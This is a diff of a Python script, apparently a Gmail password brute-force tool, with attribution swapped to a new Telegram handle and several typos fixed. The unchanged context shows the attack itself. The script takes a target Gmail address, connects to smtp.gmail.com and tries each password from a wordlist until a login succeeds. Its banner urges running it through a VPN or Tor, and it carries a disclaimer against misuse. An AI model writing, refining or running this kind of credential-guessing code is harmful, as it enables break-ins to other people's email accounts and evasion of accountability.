@@ -1,7 +1,7 @@
 # *  Author  : Akash Black Hat
 # *  GitHub  : https://github.com/akashblackhat
-# *  YouTub  : TECHNICAL AKASH SKILLS
-# *  FacebooK: https://shorturl.at/MO019
+# *  YouTube : TECHNICAL AKASH SKILLS
+# *  Telegram: https://t.me/blueskybd
 # *  License : MIT
 
 import smtplib, sys, os, random
@@ -19,8 +19,7 @@ RAND = random.choice(colors)
 
 GMAIL_PORT = '587'
 
-
-# AKASH BANER
+# BLUE SKY BANER
 def artwork():
     print("\n")
     print('''\033[32m
@@ -36,13 +35,13 @@ def artwork():
  ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║
  ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝        
-⚠️WARNING:I AM NOT RESPONSIBLE FOR THE MISUSE OF THIS TOOL !
+⚠️WARNING: I AM NOT RESPONSIBLE FOR THE MISUSE OF THIS TOOL !
 *******************************************************
 * Author   : Akash Black Hat
 * GitHub   : https://github.com/akashblackhat
-* YouTub   : TECHNICAL AKASH SKILLS
-* Instagram: akashblackhat
-* password : passworld.txt
+* YouTube  : TECHNICAL AKASH SKILLS
+* Telegram : https://t.me/blueskybd
+* Password : passworld.txt
 *************USE VPN OR TOR SERVICE********************
 ''')
 artwork()
@@ -51,7 +50,7 @@ smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
 smtp.ehlo()
 smtp.starttls()
 
-user = input("While The Target Gmail Adress: ")
+user = input("While The Target Gmail Address: ")
 pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\nOptions: ")
 
 if pwd == '0':
@@ -63,8 +62,9 @@ elif pwd == '1':
 
 else:
     print("\n")
-    print("Invalid input! Terminaling...")
+    print("Invalid input! Terminating...")
     sys.exit(1)
+
 try:
     passswfile = open(passswfile, "r")
 
@@ -80,6 +80,8 @@ for password in passswfile:
         break
 
     except smtplib.SMTPAuthenticationError:
-        print("[-] Pasword Is Wrong. %s " % password)
-        # Author  : Akash Black Hat
-        #thank you hackers
+        print("[-] Password Is Wrong. %s " % password)
+
+# Author  : Akash Black Hat
+# Updated by BLUE SKY BD
+# Telegram: https://t.me/blueskybd
